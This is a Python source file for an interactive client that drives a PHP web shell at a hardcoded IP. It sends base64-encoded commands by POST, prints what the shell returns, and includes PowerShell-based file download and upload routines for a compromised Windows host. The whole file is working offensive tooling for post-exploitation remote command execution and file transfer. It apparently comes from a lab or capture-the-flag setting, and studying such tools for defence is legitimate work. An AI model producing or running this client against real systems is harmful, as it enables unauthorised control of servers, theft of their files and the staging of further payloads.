import base64
import shlex
from pathlib import Path
from typing import Optional, Tuple

import requests

try:
    import readline  # type: ignore[import]
except Exception:
    readline = None  # type: ignore[assignment]

SCHEME = "http"
HOST = "10.143.4.133"
PATH = "/includes/shell.php"
TIMEOUT = None
SEPARATOR = "=" * 60
SUB_SEPARATOR = "-" * 60


def build_url() -> str:
    return f"{SCHEME}://{HOST}{PATH}"


def encode_cmd(cmd: str) -> str:
    data = cmd.encode("utf-8", errors="ignore")
    return base64.b64encode(data).decode("ascii")


def send_command(cmd: str) -> Tuple[str, Optional[int]]:
    encoded = encode_cmd(cmd)
    url = build_url()
    try:
        if TIMEOUT is None:
            res = requests.post(url, data={"c": encoded})
        else:
            res = requests.post(url, data={"c": encoded}, timeout=TIMEOUT)
    except requests.exceptions.Timeout:
        return "request timed out", None
    except requests.exceptions.ConnectionError:
        return "connection failed", None
    except requests.RequestException as exc:
        return f"request error: {exc}", None
    body = res.text.strip()
    if not res.ok:
        prefix = f"http {res.status_code}"
        if body:
            return f"{prefix}: {body}", res.status_code
        return prefix, res.status_code
    return body, res.status_code


def extract_pre(text: str) -> str:
    """
    Extract content inside the <pre>...</pre> that shell.php wraps around output.
    Falls back to returning the whole body if tags are not found.
    """
    lower = text.lower()
    start = lower.find("<pre>")
    end = lower.rfind("</pre>")
    if start == -1 or end == -1 or end <= start:
        return text
    return text[start + len("<pre>") : end].strip()


def ps_escape_single_quotes(value: str) -> str:
    """
    Escape single quotes for use inside a single-quoted PowerShell string literal.
    In PowerShell, single quotes are escaped by doubling them: ' -> ''.
    """
    return value.replace("'", "''")


def download_file(remote_path: str, local_path: str) -> None:
    """
    Download a remote file from a **Windows** target by having PowerShell
    base64-encode it, then decoding and writing it locally.
    """
    # Build a PowerShell command that prints base64 of the file to stdout
    remote_ps = ps_escape_single_quotes(remote_path)
    cmd = (
        "powershell -NoLogo -NonInteractive -Command "
        f"\"[Convert]::ToBase64String([IO.File]::ReadAllBytes('{remote_ps}'))\""
    )
    body, status = send_command(cmd)
    if status is not None and status != 200:
        raise RuntimeError(f"download failed, status={status}: {body}")

    inner = extract_pre(body)
    inner = inner.strip()
    if not inner:
        raise RuntimeError("download failed: empty response/body")

    try:
        data = base64.b64decode(inner, validate=False)
    except Exception as exc:
        raise RuntimeError(f"download failed: invalid base64 data ({exc})") from exc

    path = Path(local_path)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data)
    print(f"[download] saved remote '{remote_path}' to '{local_path}' ({len(data)} bytes)")


def upload_file(local_path: str, remote_path: str) -> None:
    """
    Upload a local file to a **Windows** target by base64-encoding it locally
    and having PowerShell decode it into a file on the remote side.
    """
    path = Path(local_path)
    if not path.is_file():
        raise FileNotFoundError(f"local file not found: {local_path}")

    data = path.read_bytes()
    b64 = base64.b64encode(data).decode("ascii")

    # We wrap the base64 string in single quotes; base64 output will not
    # contain single quotes, so this is safe.
    remote_ps = ps_escape_single_quotes(remote_path)
    cmd = (
        "powershell -NoLogo -NonInteractive -Command "
        f"\"[IO.File]::WriteAllBytes('{remote_ps}', "
        f"[Convert]::FromBase64String('{b64}'))\""
    )
    body, status = send_command(cmd)

    # If there was any error, it'll show up in the body; we just print it.
    print_response(f"[upload {local_path} -> {remote_path}]", body, status)
    print(f"[upload] sent '{local_path}' ({len(data)} bytes) to remote '{remote_path}'")


def print_response(cmd: str, body: str, status: Optional[int]) -> None:
    print(SEPARATOR)
    print(f"cmd: {cmd}")
    if status is not None:
        print(f"status: {status}")
    print(SUB_SEPARATOR)
    text = body.strip()
    if not text:
        print("[no output]")
    else:
        lines = [line.rstrip() for line in text.splitlines()]
        blank = False
        for line in lines:
            if line:
                if blank:
                    blank = False
                print(line)
            else:
                if not blank:
                    print()
                    blank = True
    print(SEPARATOR)


def read_cmd() -> Optional[str]:
    try:
        value = input("cmd> ")
    except (EOFError, KeyboardInterrupt):
        return None
    value = value.strip()
    if not value or value.lower() in ("exit", "quit"):
        return None
    if readline is not None and value:
        try:
            readline.add_history(value)
        except Exception:
            pass
    return value


def main() -> None:
    print("Type commands to send to the remote shell.")
    print("Use 'exit' or 'quit', press Ctrl+D (EOF), or Ctrl+C to exit.")
    print("Special local commands:")
    print("  :download <remote_path> <local_path>")
    print("  :upload <local_path> <remote_path>")
    while True:
        cmd = read_cmd()
        if cmd is None:
            print("Exiting client.")
            break

        # Local meta-commands for file transfer
        if cmd.startswith(":download "):
            parts = cmd.split(maxsplit=2)
            if len(parts) != 3:
                print("usage: :download <remote_path> <local_path>")
                continue
            _, remote_path, local_path = parts
            try:
                download_file(remote_path, local_path)
            except Exception as exc:
                print(f"[download error] {exc}")
            continue

        if cmd.startswith(":upload "):
            parts = cmd.split(maxsplit=2)
            if len(parts) != 3:
                print("usage: :upload <local_path> <remote_path>")
                continue
            _, local_path, remote_path = parts
            try:
                upload_file(local_path, remote_path)
            except Exception as exc:
                print(f"[upload error] {exc}")
            continue

        try:
            body, status = send_command(cmd)
        except KeyboardInterrupt:
            # Allow Ctrl+C during a running request to exit cleanly
            print("\n[interrupted while sending command, exiting]")
            break
        print_response(cmd, body, status)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        # Fallback handler for any uncaught Ctrl+C
        print("\n[interrupted by user, exiting]")

